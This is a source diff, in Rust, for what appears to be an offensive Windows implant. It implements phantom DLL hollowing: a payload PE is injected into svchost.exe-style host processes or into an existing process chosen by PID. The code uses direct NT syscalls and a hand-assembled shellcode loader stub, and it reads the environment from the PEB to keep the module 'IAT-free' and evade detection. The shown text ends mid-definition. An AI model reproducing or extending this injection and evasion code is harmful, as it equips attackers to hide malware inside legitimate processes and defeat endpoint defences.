@@ -37,14 +37,15 @@
 ))]
 
 use anyhow::{anyhow, Result};
-use winapi::ctypes::c_void;
-use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
-use winapi::um::winnt::{
-    CONTEXT, CONTEXT_FULL, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64,
-    IMAGE_NT_OPTIONAL_HDR64_MAGIC, IMAGE_NT_SIGNATURE, IMAGE_SECTION_HEADER, PAGE_EXECUTE_READ,
-    PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, SEC_COMMIT,
-};
-
+use std::ffi::c_void;
+use crate::win_types::OBJECT_ATTRIBUTES;
+use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, SEC_COMMIT};
+use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
+use crate::win_types::{CONTEXT, CONTEXT_FULL, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
+use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC;
+use windows_sys::Win32::System::Memory::PAGE_READONLY;
 // ── NT constants (not exported by winapi) ────────────────────────────────────
 
 const NT_SECTION_ALL_ACCESS: u32 = 0x000F_001F;
@@ -99,7 +100,7 @@ pub struct PhantomHollowResult {
 struct NtObjectAttributes {
     length: u32,
     root_directory: *mut c_void,
-    object_name: *mut winapi::shared::ntdef::UNICODE_STRING,
+    object_name: *mut crate::win_types::UNICODE_STRING,
     attributes: u32,
     security_descriptor: *mut c_void,
     security_quality_of_service: *mut c_void,
@@ -113,10 +114,118 @@ struct IoStatusBlock {
 
 // ── Host candidate paths ─────────────────────────────────────────────────────
 
+/// Read the value of an environment variable from the PEB's environment
+/// block, avoiding `std::env::var` (which calls `kernel32!GetEnvironmentVariableW`
+/// and creates an IAT entry the module otherwise avoids).
+///
+/// The PEB → `ProcessParameters` → `Environment` pointer leads to a block of
+/// null-terminated UTF-16LE strings of the form `KEY=VALUE\0`, terminated by
+/// an extra `\0`.
+#[cfg(target_arch = "x86_64")]
+unsafe fn get_env_from_peb(key: &str) -> Option<String> {
+    // TEB is at gs:[0x30] on x86_64; PEB is at TEB offset 0x60.
+    let teb: *const u8;
+    std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+    let peb = teb.add(0x60) as *const *const u8;
+    let peb_ptr = peb.read_unaligned();
+
+    // RTL_USER_PROCESS_PARAMETERS is at PEB + 0x20.
+    let params_ptr = (peb_ptr.add(0x20) as *const *const u8).read_unaligned();
+
+    // Environment block pointer is at offset 0x80 within
+    // RTL_USER_PROCESS_PARAMETERS (Windows 10+).
+    let env_block = (params_ptr.add(0x80) as *const *const u16).read_unaligned();
+
+    if env_block.is_null() {
+        return None;
+    }
+
+    let key_upper = key.to_ascii_uppercase();
+    let key_prefix = format!("{}=", key_upper);
+
+    // Walk through the environment block: each entry is a NUL-terminated
+    // UTF-16LE string, and the block ends with a double NUL.
+    let mut offset: isize = 0;
+    loop {
+        // Read the next UTF-16LE entry.
+        let mut entry_end = offset;
+        while *env_block.offset(entry_end) != 0 {
+            entry_end += 1;
+        }
+
+        // Two consecutive NULs → end of block.
+        if entry_end == offset {
+            break;
+        }
+
+        // Decode the entry to a String.
+        let len = (entry_end - offset) as usize;
+        let slice = std::slice::from_raw_parts(env_block.offset(offset), len);
+        if let Ok(entry) = String::from_utf16(slice) {
+            if let Some(rest) = entry.strip_prefix(&key_prefix) {
+                return Some(rest.to_string());
+            }
+        }
+
+        offset = entry_end + 1;
+    }
+
+    None
+}
+
+#[cfg(target_arch = "aarch64")]
+unsafe fn get_env_from_peb(key: &str) -> Option<String> {
+    // TEB is at TPIDR_EL0 on AArch64; PEB is at TEB + 0x60.
+    let teb: *const u8;
+    std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
+    let peb = teb.add(0x60) as *const *const u8;
+    let peb_ptr = peb.read_unaligned();
+
+    let params_ptr = (peb_ptr.add(0x20) as *const *const u8).read_unaligned();
+    let env_block = (params_ptr.add(0x80) as *const *const u16).read_unaligned();
+
+    if env_block.is_null() {
+        return None;
+    }
+
+    let key_upper = key.to_ascii_uppercase();
+    let key_prefix = format!("{}=", key_upper);
+
+    let mut offset: isize = 0;
+    loop {
+        let mut entry_end = offset;
+        while *env_block.offset(entry_end) != 0 {
+            entry_end += 1;
+        }
+
+        if entry_end == offset {
+            break;
+        }
+
+        let len = (entry_end - offset) as usize;
+        let slice = std::slice::from_raw_parts(env_block.offset(offset), len);
+        if let Ok(entry) = String::from_utf16(slice) {
+            if let Some(rest) = entry.strip_prefix(&key_prefix) {
+                return Some(rest.to_string());
+            }
+        }
+
+        offset = entry_end + 1;
+    }
+
+    None
+}
+
 /// Return a list of legitimate system executables suitable as phantom hollowing
 /// hosts.  The process will appear as one of these binaries after hollowing.
+///
+/// Reads `SystemRoot` from the PEB environment block instead of via
+/// `std::env::var` to avoid creating a `kernel32!GetEnvironmentVariableW`
+/// IAT entry in this otherwise IAT-free module.
 fn host_candidate_paths() -> Vec<String> {
-    let sys_dir = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
+    let sys_dir = unsafe {
+        get_env_from_peb("SystemRoot").unwrap_or_else(|| r"C:\Windows".to_string())
+    };
     let sys32 = format!(r"{}\System32", sys_dir);
     [
         format!(r"{}\svchost.exe", sys32),
@@ -173,7 +282,7 @@ unsafe fn create_suspended_process_nt(exe_path: &str) -> Result<(*mut c_void, *m
     // Build NT namespace path and UNICODE_STRING.
     let mut path_wide = dos_to_nt_path(exe_path);
     let byte_len = ((path_wide.len() - 1) * 2) as u16;
-    let mut ustr = winapi::shared::ntdef::UNICODE_STRING {
+    let mut ustr = crate::win_types::UNICODE_STRING {
         Length: byte_len,
         MaximumLength: byte_len + 2,
         Buffer: path_wide.as_mut_ptr(),
@@ -349,7 +458,7 @@ unsafe fn apply_relocations_remote(
     delta: isize,
 ) -> Result<()> {
     let reloc_dir = &(*nt).OptionalHeader.DataDirectory
-        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+        [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
     if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
         return Err(anyhow!(
             "phantom_dll_hollow: PE has no relocation directory, cannot rebased"
@@ -480,14 +589,14 @@ unsafe fn fix_iat_remote(
     payload: &[u8],
 ) -> Result<()> {
     let import_dir = &(*nt).OptionalHeader.DataDirectory
-        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
+        [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
     if import_dir.VirtualAddress == 0 || import_dir.Size == 0 {
         // No imports — nothing to do.
         return Ok(());
     }
 
     let import_rva = import_dir.VirtualAddress as usize;
-    let desc_size = std::mem::size_of::<winapi::um::winnt::IMAGE_IMPORT_DESCRIPTOR>();
+    let desc_size = std::mem::size_of::<windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR>();
 
     let mut desc_idx = 0;
     loop {
@@ -661,14 +770,14 @@ unsafe fn apply_section_protections(
     for i in 0..num_sections {
         let sec = &*first_section.add(i);
         let sec_va = sec.VirtualAddress as usize;
-        let sec_vs = *sec.Misc.VirtualSize() as usize;
+        let sec_vs = sec.Misc.VirtualSize as usize;
         if sec_va == 0 || sec_vs == 0 {
             continue;
         }
 
         // Determine target protection from section characteristics.
-        let is_exec = sec.Characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0;
-        let is_write = sec.Characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0;
+        let is_exec = sec.Characteristics & windows_sys::Win32::System::SystemServices::IMAGE_SCN_MEM_EXECUTE != 0;
+        let is_write = sec.Characteristics & windows_sys::Win32::System::SystemServices::IMAGE_SCN_MEM_WRITE != 0;
 
         let target_prot = if is_exec && is_write {
             PAGE_EXECUTE_READWRITE
@@ -772,17 +881,30 @@ fn rva_to_file_offset(payload: &[u8], rva: usize) -> usize {
 /// The caller is responsible for closing the returned handles.
 pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> {
     // ── Validate payload ─────────────────────────────────────────────────
-    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
+    if payload.len() < 0x40 {
+        return Err(anyhow!(
+            "phantom_dll_hollow: payload too small for DOS header ({}/0x40 min)",
+            payload.len()
+        ));
+    }
+    if payload[0] != b'M' || payload[1] != b'Z' {
         return Err(anyhow!(
             "phantom_dll_hollow: payload is not a PE (no MZ header)"
         ));
     }
 
-    let e_lfanew =
-        u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]]) as usize;
-    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
+    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
+    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
         return Err(anyhow!(
-            "phantom_dll_hollow: NT headers extend beyond payload"
+            "phantom_dll_hollow: DOS signature mismatch"
+        ));
+    }
+    let e_lfanew = (*dos).e_lfanew as usize;
+    if e_lfanew == 0 || e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
+        return Err(anyhow!(
+            "phantom_dll_hollow: NT headers extend beyond payload (e_lfanew={:#x}, len={})",
+            e_lfanew,
+            payload.len()
         ));
     }
 
@@ -806,6 +928,25 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
     let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
     let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
     let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
+    let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
+
+    if image_size == 0 {
+        return Err(anyhow!("phantom_dll_hollow: PE has SizeOfImage=0"));
+    }
+    if entry_point_rva >= image_size {
+        return Err(anyhow!(
+            "phantom_dll_hollow: entry point RVA {:#x} outside image size {:#x}",
+            entry_point_rva,
+            image_size
+        ));
+    }
+    if size_of_headers > payload.len() {
+        return Err(anyhow!(
+            "phantom_dll_hollow: SizeOfHeaders {:#x} exceeds payload size {:#x}",
+            size_of_headers,
+            payload.len()
+        ));
+    }
 
     // Ensure SSN infrastructure is initialised.
     let _ = nt_syscall::init_syscall_infrastructure();
@@ -892,7 +1033,7 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         let raw_off = sec.PointerToRawData as usize;
         let raw_sz = sec.SizeOfRawData as usize;
         let va = sec.VirtualAddress as usize;
-        let vs = *sec.Misc.VirtualSize() as usize;
+        let vs = sec.Misc.VirtualSize as usize;
         if raw_off == 0 || raw_sz == 0 || raw_off + raw_sz > payload.len() {
             continue;
         }
@@ -1137,7 +1278,260 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         tracing::warn!("phantom_dll_hollow: failed to update PEB.ImageBaseAddress");
     }
 
-    // ── Phase 4: Set thread context and resume ───────────────────────────
+    // ── Phase 4: Build loader stub (TLS callbacks, .pdata, DllMain) and resume ─
+    //
+    // The Windows loader normally:
+    //   1. Calls RtlAddFunctionTable to register .pdata for SEH unwinding.
+    //   2. Invokes TLS callbacks with (hinstDLL, DLL_PROCESS_ATTACH, NULL).
+    //   3. Calls the entry point as DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL).
+    //
+    // Since we bypass the loader entirely, we build a position-independent
+    // shellcode stub that performs this missing work before jumping to the
+    // payload entry point with the correct DllMain calling convention.
+
+    // Collect TLS callbacks from the PE's TLS directory.
+    let mut tls_callback_vas: Vec<usize> = Vec::new();
+    {
+        const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
+        let tls_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+        if tls_dir.VirtualAddress != 0 && tls_dir.Size != 0 {
+            let tls_rva = tls_dir.VirtualAddress as usize;
+            if tls_rva + 40 <= image_size {
+                // IMAGE_TLS_DIRECTORY64 layout (40 bytes):
+                //   +0x18 AddressOfCallBacks : u64  <- VA of null-term array
+                let tls_offset = rva_to_file_offset(payload, tls_rva);
+                if tls_offset + 32 <= payload.len() {
+                    let callbacks_va_raw = u64::from_le_bytes(
+                        payload[tls_offset + 24..tls_offset + 32]
+                            .try_into()
+                            .unwrap_or([0u8; 8]),
+                    ) as usize;
+                    if callbacks_va_raw != 0 {
+                        // Rebase the VA by the same delta applied during relocation.
+                        let callbacks_rva = callbacks_va_raw.wrapping_sub(preferred_base);
+                        let callbacks_file_offset = rva_to_file_offset(payload, callbacks_rva);
+                        let mut remaining = 32u32;
+                        let mut slot_idx = 0usize;
+                        loop {
+                            if remaining == 0 {
+                                break;
+                            }
+                            remaining -= 1;
+                            let slot_offset = callbacks_file_offset + slot_idx * 8;
+                            if slot_offset + 8 > payload.len() {
+                                break;
+                            }
+                            let cb_va_raw = u64::from_le_bytes(
+                                payload[slot_offset..slot_offset + 8]
+                                    .try_into()
+                                    .unwrap_or([0u8; 8]),
+                            ) as usize;
+                            if cb_va_raw == 0 {
+                                break;
+                            }
+                            // Rebase and validate.
+                            let cb_va = (cb_va_raw as isize + delta) as usize;
+                            if cb_va >= remote_base_usize
+                                && cb_va < remote_base_usize + image_size
+                            {
+                                tls_callback_vas.push(cb_va);
+                            }
+                            slot_idx += 1;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Find .pdata section for exception unwinding registration.
+    let (pdata_va, pdata_count) = {
+        let mut result = (0usize, 0u32);
+        const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
+        let exc_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+        if exc_dir.VirtualAddress != 0 && exc_dir.Size > 0 {
+            let va = remote_base_usize + exc_dir.VirtualAddress as usize;
+            let count = (exc_dir.Size as usize / 12) as u32;
+            if count > 0 {
+                result = (va, count);
+            }
+        }
+        result
+    };
+
+    // Resolve RtlAddFunctionTable from ntdll via PEB-walk.
+    let rtl_add_fn_addr = if pdata_va != 0 && pdata_count != 0 {
+        resolve_nt(b"RtlAddFunctionTable\0").unwrap_or(0)
+    } else {
+        0
+    };
+
+    let needs_stub = !tls_callback_vas.is_empty()
+        || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);
+
+    // Build the loader stub if needed, otherwise jump directly to entry point.
+    let thread_start_va = if needs_stub {
+        let mut stub: Vec<u8> = Vec::with_capacity(256);
+
+        #[cfg(target_arch = "x86_64")]
+        {
+            // ABI prologue: reserve 32 bytes of shadow space.
+            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20
+
+            // .pdata registration.
+            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
+                stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, pdata_va
+                stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
+                stub.extend_from_slice(&[0xBA]); // mov edx, entry_count
+                stub.extend_from_slice(&pdata_count.to_le_bytes());
+                stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, remote_base
+                stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
+                stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, RtlAddFunctionTable
+                stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
+                stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
+            }
+
+            // TLS callback invocations: DllMain convention (hinstDLL, DLL_PROCESS_ATTACH, NULL).
+            for &cb_va in &tls_callback_vas {
+                stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
+                stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
+                stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
+                stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved = NULL)
+                stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, cb_va
+                stub.extend_from_slice(&(cb_va as u64).to_le_bytes());
+                stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
+            }
+
+            // DllMain entry point call: entry(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+            let entry_va = (remote_base_usize + entry_point_rva) as u64;
+            stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
+            stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
+            stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
+            stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved = NULL)
+            stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, entry_va
+            stub.extend_from_slice(&entry_va.to_le_bytes());
+            stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
+
+            // ABI epilogue.
+            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20
+
+            // Infinite halt after DllMain returns.
+            stub.extend_from_slice(&[0xEB, 0xFE]); // jmp $-2
+        }
+
+        #[cfg(target_arch = "aarch64")]
+        {
+            // .pdata registration: RtlAddFunctionTable(x0=funcTable, x1=count, x2=base)
+            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
+                push_arm64_mov_imm64(&mut stub, 0, pdata_va as u64);
+                push_arm64_mov_imm64(&mut stub, 1, pdata_count as u64);
+                push_arm64_mov_imm64(&mut stub, 2, remote_base_usize as u64);
+                push_arm64_mov_imm64(&mut stub, 16, rtl_add_fn_addr as u64);
+                push_arm64_blr(&mut stub, 16);
+            }
+
+            // TLS callbacks with DllMain convention.
+            for &cb_va in &tls_callback_vas {
+                push_arm64_dll_entry_call(&mut stub, cb_va as u64, remote_base_usize as u64);
+            }
+
+            // DllMain entry: entry(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+            let entry_va = (remote_base_usize + entry_point_rva) as u64;
+            push_arm64_dll_entry_call(&mut stub, entry_va, remote_base_usize as u64);
+
+            // Infinite halt after DllMain returns.
+            push_arm64_brk(&mut stub, 0xF000); // BRK #0xF000
+        }
+
+        // Allocate RW memory for the stub in the host process.
+        let mut stub_mem: *mut c_void = std::ptr::null_mut();
+        let mut stub_alloc_size = stub.len();
+        let alloc_s = crate::syscall!(
+            "NtAllocateVirtualMemory",
+            h_process as u64,
+            &mut stub_mem as *mut _ as u64,
+            0u64,
+            &mut stub_alloc_size as *mut _ as u64,
+            (windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
+            crate::win_types::PAGE_READWRITE as u64,
+        );
+        let alloc_ok = match alloc_s {
+            Ok(st) if st >= 0 && !stub_mem.is_null() => true,
+            _ => false,
+        };
+        if !alloc_ok {
+            terminate_and_cleanup!();
+            return Err(anyhow!(
+                "phantom_dll_hollow: NtAllocateVirtualMemory for loader stub failed"
+            ));
+        }
+
+        // Write stub bytes.
+        let mut stub_written = 0usize;
+        let write_s = crate::syscall!(
+            "NtWriteVirtualMemory",
+            h_process as u64,
+            stub_mem as u64,
+            stub.as_ptr() as u64,
+            stub.len() as u64,
+            &mut stub_written as *mut _ as u64,
+        );
+        let write_ok = match write_s {
+            Ok(st) if st >= 0 => stub_written == stub.len(),
+            _ => false,
+        };
+        if !write_ok {
+            terminate_and_cleanup!();
+            return Err(anyhow!(
+                "phantom_dll_hollow: NtWriteVirtualMemory for loader stub failed"
+            ));
+        }
+
+        // Make the stub executable (RX).
+        let mut prot_base = stub_mem;
+        let mut prot_size = stub.len();
+        let mut old_prot = 0u32;
+        let prot_s = crate::syscall!(
+            "NtProtectVirtualMemory",
+            h_process as u64,
+            &mut prot_base as *mut _ as u64,
+            &mut prot_size as *mut _ as u64,
+            PAGE_EXECUTE_READ as u64,
+            &mut old_prot as *mut _ as u64,
+        );
+        let prot_ok = match prot_s {
+            Ok(st) if st >= 0 => true,
+            _ => false,
+        };
+        if !prot_ok {
+            terminate_and_cleanup!();
+            return Err(anyhow!(
+                "phantom_dll_hollow: NtProtectVirtualMemory(RX) for loader stub failed"
+            ));
+        }
+
+        // Flush instruction cache for the stub.
+        let _ = crate::syscall!(
+            "NtFlushInstructionCache",
+            h_process as u64,
+            stub_mem as u64,
+            stub.len() as u64,
+        );
+
+        tracing::debug!(
+            "phantom_dll_hollow: injected loader stub at {:p} ({} TLS callbacks, .pdata={} entries)",
+            stub_mem,
+            tls_callback_vas.len(),
+            pdata_count,
+        );
+
+        stub_mem as u64
+    } else {
+        // No TLS callbacks and no .pdata — set entry point directly.
+        (remote_base_usize + entry_point_rva) as u64
+    };
+
+    // Set the thread context and resume.
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = CONTEXT_FULL;
 
@@ -1148,12 +1542,11 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
     );
     match get_ctx {
         Ok(st) if st >= 0 => {
-            let entry_point = (remote_base_usize + entry_point_rva) as u64;
-            set_context_instruction_pointer(&mut ctx, entry_point);
+            set_context_instruction_pointer(&mut ctx, thread_start_va);
             tracing::debug!(
                 "phantom_dll_hollow: setting thread {} to {:#x}",
                 CONTEXT_IP_NAME,
-                entry_point,
+                thread_start_va,
             );
 
             let set_ctx = crate::syscall!(
@@ -1195,7 +1588,7 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         }
     }
 
-    // Resume the host thread — execution begins at the phantom DLL's entry point.
+    // Resume the host thread — execution begins at the loader stub or entry point.
     let resume = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
     match resume {
         Ok(st) if st >= 0 => {}
@@ -1225,6 +1618,938 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
     })
 }
 
+/// Phantom DLL hollowing into an **existing** target process.
+///
+/// Similar to [`phantom_dll_hollow`] but instead of creating a sacrificial host
+/// process, this variant opens an already-running process by PID and replaces
+/// its image with the phantom DLL.  This satisfies the dispatcher's
+/// target-process contract when the operator specifies a PID.
+///
+/// # How it works
+///
+/// 1. **Phase 1** — identical to `phantom_dll_hollow`: create a `SEC_COMMIT`
+///    section, map locally, write the PE image.
+/// 2. **Phase 2** — open the target process by PID via `NtOpenProcess`, then
+///    obtain a thread handle via `NtGetNextThread` (or fall back to creating a
+///    new suspended thread with `NtCreateThreadEx`).
+/// 3. **Phase 3** — read the target's PEB, unmap its original image, map the
+///    phantom section at the original base (or let the kernel choose), fix
+///    relocations, rebuild IAT, apply section protections, update PEB.
+/// 4. **Phase 4** — set the thread's instruction pointer to the phantom entry
+///    point and resume.
+///
+/// # Arguments
+///
+/// * `pid` — Process ID of the target process.
+/// * `payload` — PE64 image bytes to inject.
+///
+/// # Safety
+///
+/// Performs direct NT syscalls and manipulates remote process memory.
+/// The caller is responsible for closing the returned handles.
+pub unsafe fn phantom_dll_hollow_into_process(
+    pid: u32,
+    payload: &[u8],
+) -> Result<PhantomHollowResult> {
+    // ── Validate payload ─────────────────────────────────────────────────
+    if payload.len() < 0x40 {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: payload too small for DOS header ({}/0x40 min)",
+            payload.len()
+        ));
+    }
+    if payload[0] != b'M' || payload[1] != b'Z' {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: payload is not a valid PE (missing MZ signature)"
+        ));
+    }
+    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
+    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: DOS signature mismatch"
+        ));
+    }
+    let e_lfanew = (*dos).e_lfanew as usize;
+    if e_lfanew == 0 || e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: NT headers extend beyond payload (e_lfanew={:#x}, len={})",
+            e_lfanew,
+            payload.len()
+        ));
+    }
+    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
+    if (*nt).Signature != IMAGE_NT_SIGNATURE {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: NT signature mismatch"
+        ));
+    }
+    if (*nt).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: not a PE64 image"
+        ));
+    }
+    if (*nt).FileHeader.Machine != EXPECTED_PE_MACHINE {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: PE machine {:#06x} does not match this agent ({:#06x})",
+            (*nt).FileHeader.Machine,
+            EXPECTED_PE_MACHINE
+        ));
+    }
+
+    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
+    let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
+    let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
+    let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
+
+    if image_size == 0 {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: PE has SizeOfImage=0"
+        ));
+    }
+    if entry_point_rva >= image_size {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: entry point RVA {:#x} outside image size {:#x}",
+            entry_point_rva,
+            image_size
+        ));
+    }
+    if size_of_headers > payload.len() {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: SizeOfHeaders {:#x} exceeds payload size {:#x}",
+            size_of_headers,
+            payload.len()
+        ));
+    }
+
+    // Ensure SSN infrastructure is initialised.
+    let _ = nt_syscall::init_syscall_infrastructure();
+
+    // ── Phase 1: Create phantom section + map into calling process ───────
+    let mut h_section: *mut c_void = std::ptr::null_mut();
+    let mut section_size: i64 = image_size as i64;
+    let s = crate::syscall!(
+        "NtCreateSection",
+        &mut h_section as *mut _ as u64,
+        NT_SECTION_ALL_ACCESS as u64,
+        0u64,
+        &mut section_size as *mut _ as u64,
+        PAGE_EXECUTE_READWRITE as u64,
+        SEC_COMMIT as u64,
+        0u64,
+    )
+    .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtCreateSection SSN: {e}"))?;
+    if s < 0 || h_section.is_null() {
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: NtCreateSection NTSTATUS {:#010x}",
+            s as u32
+        ));
+    }
+
+    let mut local_base: *mut c_void = std::ptr::null_mut();
+    let mut view_size: usize = 0;
+    let s = crate::syscall!(
+        "NtMapViewOfSection",
+        h_section as u64,
+        NT_CURRENT_PROCESS as u64,
+        &mut local_base as *mut _ as u64,
+        0u64,
+        0u64,
+        std::ptr::null_mut::<u64>() as u64,
+        &mut view_size as *mut _ as u64,
+        1u64,
+        0u64,
+        PAGE_READWRITE as u64,
+    )
+    .map_err(|e| anyhow!(
+        "phantom_dll_hollow_into_process: NtMapViewOfSection(local) SSN: {e}"
+    ))?;
+    if s < 0 || local_base.is_null() {
+        close_handle!(h_section);
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: NtMapViewOfSection(local) NTSTATUS {:#010x}",
+            s as u32
+        ));
+    }
+
+    // Write the PE image into the local mapping.
+    std::ptr::write_bytes(local_base as *mut u8, 0, view_size);
+
+    let headers_size = (*nt).OptionalHeader.SizeOfHeaders as usize;
+    if headers_size > payload.len() || headers_size > view_size {
+        close_handle!(h_section);
+        let _ = crate::syscall!(
+            "NtUnmapViewOfSection",
+            NT_CURRENT_PROCESS as u64,
+            local_base as u64,
+        );
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: SizeOfHeaders exceeds payload or view"
+        ));
+    }
+    std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, headers_size);
+
+    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
+    let first_section =
+        (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
+    for i in 0..num_sections {
+        let sec = &*first_section.add(i);
+        let raw_off = sec.PointerToRawData as usize;
+        let raw_sz = sec.SizeOfRawData as usize;
+        let va = sec.VirtualAddress as usize;
+        let vs = sec.Misc.VirtualSize as usize;
+        if raw_off == 0 || raw_sz == 0 || raw_off + raw_sz > payload.len() {
+            continue;
+        }
+        let copy_sz = raw_sz.min(vs).min(view_size.saturating_sub(va));
+        if va + copy_sz > view_size {
+            continue;
+        }
+        let dst = (local_base as usize + va) as *mut u8;
+        std::ptr::copy_nonoverlapping(payload.as_ptr().add(raw_off), dst, copy_sz);
+    }
+
+    // Flip local view to RX.
+    let mut old_prot = 0u32;
+    let mut prot_base = local_base as usize;
+    let mut prot_size = view_size;
+    let _ = crate::syscall!(
+        "NtProtectVirtualMemory",
+        NT_CURRENT_PROCESS as u64,
+        &mut prot_base as *mut _ as u64,
+        &mut prot_size as *mut _ as u64,
+        PAGE_EXECUTE_READ as u64,
+        &mut old_prot as *mut _ as u64,
+    );
+
+    // ── Phase 2: Open target process + obtain a thread ──────────────────
+    //
+    // Open the existing process by PID, then either find an existing thread
+    // via NtGetNextThread or create a new suspended thread inside it.
+
+    // Build a CLIENT_ID for NtOpenProcess.
+    #[repr(C)]
+    struct ClientId {
